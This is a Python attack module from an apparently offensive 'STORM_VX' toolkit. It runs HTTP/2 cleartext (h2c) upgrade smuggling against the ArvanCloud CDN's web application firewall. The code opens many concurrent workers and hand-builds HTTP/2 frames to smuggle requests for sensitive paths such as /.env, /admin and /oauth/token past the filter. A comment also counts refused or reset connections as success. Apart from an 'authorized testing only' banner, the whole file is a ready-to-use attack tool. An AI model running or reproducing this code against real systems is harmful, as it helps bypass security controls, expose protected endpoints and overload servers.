#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║  VF H2C Smuggler — HTTP/2 Cleartext Smuggling Attack Module            ║
║  Part of the STORM_VX Toolkit                                          ║
║                                                                          ║
║  Exploits h2c (HTTP/2 Cleartext) upgrade mechanism to bypass WAF.      ║
║  ArvanCloud CDN inspects HTTP/1.1 but may not inspect h2c-upgraded     ║
║  connections, allowing smuggled requests to reach the origin.           ║
║                                                                          ║
║  FOR AUTHORIZED TESTING ONLY!                                            ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import random
import string
import struct
import socket
import ssl
from typing import Dict, Optional, List
from urllib.parse import urlparse


# ─── Color Codes ──────────────────────────────────────────────────────────────

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; BD = '\033[1m'
    DM = '\033[2m'; RS = '\033[0m'


# ─── User-Agent Pool ─────────────────────────────────────────────────────────

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1",
]

def random_ua() -> str:
    return random.choice(USER_AGENTS)


# ─── H2C Smuggler Paths ──────────────────────────────────────────────────────

SMUGGLE_PATHS = [
    "/", "/index.html", "/login", "/admin", "/api/v1/status",
    "/api/data", "/health", "/status", "/robots.txt", "/sitemap.xml",
    "/wp-login.php", "/xmlrpc.php", "/.env", "/config.json",
    "/api/users", "/graphql", "/api/auth", "/oauth/token",
]


class H2CSmuggler:
    """
    HTTP/2 Cleartext Smuggling Attack.

    Opens a TCP connection and sends an HTTP/1.1 request with
    'Upgrade: h2c' and 'HTTP2-Settings' headers. If the server
    (or origin behind ArvanCloud) responds with 101 Switching
    Protocols, we upgrade to H2 and send smuggled HEADERS frames.

    The WAF sees the initial HTTP/1.1 request (which looks normal)
    but does not inspect the h2c-upgraded traffic that follows,
    allowing the smuggled request to pass through unfiltered.

    ArvanCloud status codes for blocking: 403, 429, 500, 503.
    """

    # HTTP/2 connection preface
    H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

    # HTTP/2 frame types
    FRAME_DATA = 0x0
    FRAME_HEADERS = 0x1
    FRAME_SETTINGS = 0x4
    FRAME_WINDOW_UPDATE = 0x8
    FRAME_GOAWAY = 0x7
    FRAME_RST_STREAM = 0x3
    FRAME_PING = 0x6

    # Flags
    FLAG_END_STREAM = 0x1
    FLAG_END_HEADERS = 0x4

    def __init__(self, url: str, workers: int = 100, timeout: int = 15):
        self.url = url
        self.workers = workers
        self.timeout = timeout
        self.parsed = urlparse(url)
        self.host = self.parsed.hostname or ""
        self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
        self.is_ssl = self.parsed.scheme == "https"

        # Stats tracking
        self.stats = {
            "attempts": 0,
            "successful_smuggles": 0,
            "upgrade_success": 0,
            "blocked": 0,
            "errors": 0,
            "h2_frames_sent": 0,
            "status_codes": {},
        }
        self._lock = asyncio.Lock()
        self._start_time = 0.0

    def _build_h1_upgrade_request(self, path: str) -> bytes:
        """Build an HTTP/1.1 request with h2c upgrade headers."""
        # HTTP2-Settings is a base64url-encoded SETTINGS frame
        # We use default empty settings for simplicity
        http2_settings = "AAMAAAABAAAAAA"  # Empty SETTINGS frame, base64url

        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {random_ua()}\r\n"
            f"Accept: */*\r\n"
            f"Connection: Upgrade, HTTP2-Settings\r\n"
            f"Upgrade: h2c\r\n"
            f"HTTP2-Settings: {http2_settings}\r\n"
            f"Accept-Encoding: gzip, deflate\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
            f"\r\n"
        )
        return request.encode("utf-8")

    def _build_settings_frame(self) -> bytes:
        """Build an HTTP/2 SETTINGS frame with common values."""
        # SETTINGS frame with: MAX_CONCURRENT_STREAMS=200, INITIAL_WINDOW_SIZE=65535
        settings_payload = b""
        # MAX_CONCURRENT_STREAMS (0x3) = 200
        settings_payload += struct.pack(">HI", 0x3, 200)
        # INITIAL_WINDOW_SIZE (0x4) = 65535
        settings_payload += struct.pack(">HI", 0x4, 65535)
        # MAX_FRAME_SIZE (0x5) = 16384
        settings_payload += struct.pack(">HI", 0x5, 16384)

        # Frame header: length (3 bytes) + type (1 byte) + flags (1 byte) + stream_id (4 bytes)
        length = len(settings_payload)
        frame_header = struct.pack(">I", length)[1:]  # 3-byte length
        frame_header += struct.pack(">B", self.FRAME_SETTINGS)  # type
        frame_header += struct.pack(">B", 0)  # flags (no ACK)
        frame_header += struct.pack(">I", 0)  # stream 0

        return frame_header + settings_payload

    def _build_settings_ack_frame(self) -> bytes:
        """Build an HTTP/2 SETTINGS ACK frame."""
        frame_header = struct.pack(">I", 0)[1:]  # length 0
        frame_header += struct.pack(">B", self.FRAME_SETTINGS)  # type
        frame_header += struct.pack(">B", 0x1)  # ACK flag
        frame_header += struct.pack(">I", 0)  # stream 0
        return frame_header

    def _build_window_update_frame(self, stream_id: int, increment: int = 65535) -> bytes:
        """Build an HTTP/2 WINDOW_UPDATE frame."""
        payload = struct.pack(">I", increment)
        length = len(payload)
        frame_header = struct.pack(">I", length)[1:]
        frame_header += struct.pack(">B", self.FRAME_WINDOW_UPDATE)
        frame_header += struct.pack(">B", 0)
        frame_header += struct.pack(">I", stream_id)
        return frame_header + payload

    def _build_headers_frame(self, stream_id: int, path: str, method: str = "GET") -> bytes:
        """Build a simple HTTP/2 HEADERS frame using HPACK-like encoding.

        For simplicity, we use raw HPACK-encoded headers. This is a minimal
        implementation that encodes common headers without a full HPACK encoder.
        """
        # Simple HPACK encoding:
        # :method GET = indexed field (index 2)
        # :path / = indexed field (index 4)
        # :scheme http = indexed field (index 6)
        # :authority host = literal with indexing

        headers_block = b""

        # :method = GET (indexed, index 2) -> 0x82
        if method == "GET":
            headers_block += b"\x82"
        elif method == "POST":
            headers_block += b"\x83"
        else:
            headers_block += b"\x82"

        # :path = (indexed, varies by path)
        if path == "/":
            headers_block += b"\x84"  # index 4
        else:
            # Literal header field with incremental indexing
            # :path (index 5 = :path, but we use literal)
            headers_block += b"\x04"  # literal, index 4 (:path) with no index
            encoded_path = path.encode("utf-8")
            headers_block += self._encode_integer(len(encoded_path), 7)
            headers_block += encoded_path

        # :scheme = http or https (indexed)
        headers_block += b"\x86" if not self.is_ssl else b"\x87"

        # :authority = host (literal with indexing, name index 1)
        headers_block += b"\x41"  # literal with indexing, name index 1 (:authority)
        host_bytes = self.host.encode("utf-8")
        headers_block += self._encode_integer(len(host_bytes), 7)
        headers_block += host_bytes

        # user-agent (literal with indexing)
        ua = random_ua().encode("utf-8")
        headers_block += b"\x5a"  # literal with indexing, name index 58 (user-agent)
        headers_block += self._encode_integer(len(ua), 7)
        headers_block += ua

        # accept (literal without indexing)
        headers_block += b"\x50"  # literal without indexing, name index 19 (accept)
        accept = b"*/*"
        headers_block += self._encode_integer(len(accept), 7)
        headers_block += accept

        length = len(headers_block)
        flags = self.FLAG_END_HEADERS | self.FLAG_END_STREAM

        frame_header = struct.pack(">I", length)[1:]
        frame_header += struct.pack(">B", self.FRAME_HEADERS)
        frame_header += struct.pack(">B", flags)
        frame_header += struct.pack(">I", stream_id & 0x7FFFFFFF)

        return frame_header + headers_block

    @staticmethod
    def _encode_integer(value: int, prefix_bits: int) -> bytes:
        """Encode an integer using HPACK integer encoding."""
        max_prefix = (1 << prefix_bits) - 1
        if value < max_prefix:
            return bytes([value])
        result = bytes([max_prefix])
        value -= max_prefix
        while value >= 128:
            result += bytes([(value & 0x7F) | 0x80])
            value >>= 7
        result += bytes([value])
        return result

    async def _update_stats(self, key: str, delta: int = 1):
        """Thread-safe stats update."""
        async with self._lock:
            self.stats[key] = self.stats.get(key, 0) + delta

    async def _update_status_code(self, code: int):
        """Track status code distribution."""
        async with self._lock:
            self.stats["status_codes"][str(code)] = self.stats["status_codes"].get(str(code), 0) + 1

    def _is_blocked(self, status_code: int) -> bool:
        """Check if the response indicates ArvanCloud WAF blocking."""
        return status_code in (403, 429, 500, 503)

    async def _smuggle_worker(self, worker_id: int, stop_event: asyncio.Event):
        """Single worker that performs h2c smuggling attempts."""
        while not stop_event.is_set():
            path = random.choice(SMUGGLE_PATHS)
            # Add cache buster
            path = f"{path}{'&' if '?' in path else '?'}_={random.randint(100000, 999999)}"

            try:
                await self._do_smuggle(path, worker_id, stop_event)
            except Exception as e:
                await self._update_stats("errors")
                if "refused" in str(e).lower() or "reset" in str(e).lower():
                    # Server is struggling - success indicator
                    pass

            # Brief pause between attempts
            await asyncio.sleep(random.uniform(0.01, 0.1))

    async def _do_smuggle(self, path: str, worker_id: int, stop_event: asyncio.Event):
        """Perform a single h2c smuggling attempt."""
        await self._update_stats("attempts")

        reader: Optional[asyncio.StreamReader] = None
        writer: Optional[asyncio.StreamWriter] = None

        try:
            # Step 1: Open TCP connection
            if self.is_ssl:
                # For SSL, we need to connect without verifying to the origin
                # We try to use the raw socket approach
                ssl_ctx = ssl.create_default_context()
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.host, self.port, ssl=ssl_ctx),
                    timeout=self.timeout,
                )
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.host, self.port),
                    timeout=self.timeout,
                )

            # Step 2: Send HTTP/1.1 upgrade request
            upgrade_req = self._build_h1_upgrade_request(path)
            writer.write(upgrade_req)
            await writer.drain()

            # Step 3: Read response
            try:
                response_data = await asyncio.wait_for(
                    reader.read(4096), timeout=self.timeout
                )
            except asyncio.TimeoutError:
                await self._update_stats("errors")
                return

            if not response_data:
                await self._update_stats("errors")
                return

            response_str = response_data.decode("utf-8", errors="ignore")
            status_line = response_str.split("\r\n")[0] if "\r\n" in response_str else ""

            # Parse status code from HTTP/1.1 response
            try:
                status_code = int(status_line.split(" ", 2)[1])
            except (IndexError, ValueError):
                status_code = 0

            await self._update_status_code(status_code)

            # Check for WAF blocking
            if self._is_blocked(status_code):
                await self._update_stats("blocked")
                return

            # Step 4: If 101 Switching Protocols, upgrade to h2c
            if "101" in status_line and "Switching Protocols" in status_line:
                await self._update_stats("upgrade_success")

                # Step 5: Send H2 connection preface
                writer.write(self.H2_PREFACE)
                await writer.drain()

                # Step 6: Send SETTINGS frame
                writer.write(self._build_settings_frame())
                await writer.drain()

                # Step 7: Send WINDOW_UPDATE
                writer.write(self._build_window_update_frame(0))
                await writer.drain()

                # Step 8: Read server's SETTINGS
                try:
                    await asyncio.wait_for(reader.read(4096), timeout=5)
                except asyncio.TimeoutError:
                    pass

                # Step 9: Send SETTINGS ACK
                writer.write(self._build_settings_ack_frame())
                await writer.drain()

                # Step 10: Send smuggled HEADERS frame on stream 1
                smuggle_path = random.choice(SMUGGLE_PATHS)
                smuggle_path = f"{smuggle_path}{'&' if '?' in smuggle_path else '?'}_sm={random.randint(100000, 999999)}"
                headers_frame = self._build_headers_frame(1, smuggle_path)
                writer.write(headers_frame)
                await writer.drain()
                await self._update_stats("h2_frames_sent")

                # Send additional smuggled requests on new streams
                for stream_id in [3, 5, 7, 9]:
                    if stop_event.is_set():
                        break
                    extra_path = random.choice(SMUGGLE_PATHS)
                    extra_frame = self._build_headers_frame(stream_id, extra_path)
                    writer.write(extra_frame)
                    await writer.drain()
                    await self._update_stats("h2_frames_sent")

                # Try to read response
                try:
                    h2_response = await asyncio.wait_for(reader.read(8192), timeout=5)
                    if h2_response:
                        await self._update_stats("successful_smuggles")
                except asyncio.TimeoutError:
                    # Server might be processing - still count as potential success
                    await self._update_stats("successful_smuggles")

            elif status_code == 200:
                # Got 200 without upgrade - WAF might have stripped upgrade headers
                # Try direct h2c without waiting for 101
                pass

        except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError):
            await self._update_stats("errors")
        except asyncio.TimeoutError:
            await self._update_stats("errors")
        except OSError:
            await self._update_stats("errors")
        finally:
            if writer:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass

    async def _print_stats(self, stop_event: asyncio.Event):
        """Print real-time statistics."""
        while not stop_event.is_set():
            elapsed = time.time() - self._start_time
            async with self._lock:
                s = dict(self.stats)

            attempts = s.get("attempts", 0)
            smuggles = s.get("successful_smuggles", 0)
            upgrades = s.get("upgrade_success", 0)
            blocked = s.get("blocked", 0)
            errors = s.get("errors", 0)
            frames = s.get("h2_frames_sent", 0)
            aps = attempts / max(elapsed, 1)

            print(
                f"{C.CY}[H2C-SMUGGLER]{C.RS} "
                f"{C.BD}t={elapsed:.0f}s{C.RS} | "
                f"Attempts: {C.W}{attempts}{C.RS} ({aps:.1f}/s) | "
                f"Upgrades: {C.G}{upgrades}{C.RS} | "
                f"Smuggled: {C.G}{smuggles}{C.RS} | "
                f"H2-Frames: {C.CY}{frames}{C.RS} | "
                f"Blocked: {C.R}{blocked}{C.RS} | "
                f"Errors: {C.Y}{errors}{C.RS}"
            )

            # Print status code breakdown
            if s.get("status_codes"):
                codes_str = " | ".join(
                    f"{C.R if int(k) >= 400 else C.G}{k}:{v}{C.RS}"
                    for k, v in sorted(s["status_codes"].items(), key=lambda x: -x[1])
                    if v > 0
                )
                print(f"  Status: {codes_str}")

            await asyncio.sleep(3)

    async def attack(self, stop_event: asyncio.Event, stats_callback=None) -> Dict:
        """
        Main attack entry point.

        Args:
            stop_event: Event to signal graceful shutdown.
            stats_callback: Optional callback for external stats reporting.

        Returns:
            Dict with attack statistics.
        """
        self._start_time = time.time()

        print(f"{C.BD}[H2C-SMUGGLER] Starting HTTP/2 Cleartext Smuggling attack{C.RS}")
        print(f"  Target: {C.CY}{self.host}:{self.port}{C.RS}")
        print(f"  Workers: {C.W}{self.workers}{C.RS}")
        print(f"  Timeout: {C.W}{self.timeout}s{C.RS}")
        print(f"  Strategy: Upgrade HTTP/1.1 -> h2c, smuggle requests past WAF{C.RS}")

        # Launch worker tasks
        tasks = []
        for i in range(self.workers):
            task = asyncio.create_task(self._smuggle_worker(i, stop_event))
            tasks.append(task)

        # Stats printer
        stats_task = asyncio.create_task(self._print_stats(stop_event))

        # Wait for stop signal
        try:
            await stop_event.wait()
        except asyncio.CancelledError:
            pass

        # Cleanup
        stats_task.cancel()
        for task in tasks:
            task.cancel()

        await asyncio.gather(stats_task, *tasks, return_exceptions=True)

        # Final stats
        elapsed = time.time() - self._start_time
        final_stats = dict(self.stats)
        final_stats["elapsed_seconds"] = round(elapsed, 2)
        final_stats["attempts_per_second"] = round(final_stats.get("attempts", 0) / max(elapsed, 1), 2)
        final_stats["smuggle_rate"] = round(
            final_stats.get("successful_smuggles", 0) / max(final_stats.get("attempts", 1), 1) * 100, 2
        )

        print(f"\n{C.BD}[H2C-SMUGGLER] Attack finished{C.RS}")
        print(f"  Total attempts: {C.W}{final_stats.get('attempts', 0)}{C.RS}")
        print(f"  Upgrades (101): {C.G}{final_stats.get('upgrade_success', 0)}{C.RS}")
        print(f"  Successful smuggles: {C.G}{final_stats.get('successful_smuggles', 0)}{C.RS}")
        print(f"  H2 frames sent: {C.CY}{final_stats.get('h2_frames_sent', 0)}{C.RS}")
        print(f"  Blocked by WAF: {C.R}{final_stats.get('blocked', 0)}{C.RS}")
        print(f"  Errors: {C.Y}{final_stats.get('errors', 0)}{C.RS}")
        print(f"  Smuggle rate: {C.G}{final_stats.get('smuggle_rate', 0)}%{C.RS}")

        if stats_callback:
            await stats_callback(final_stats)

        return final_stats
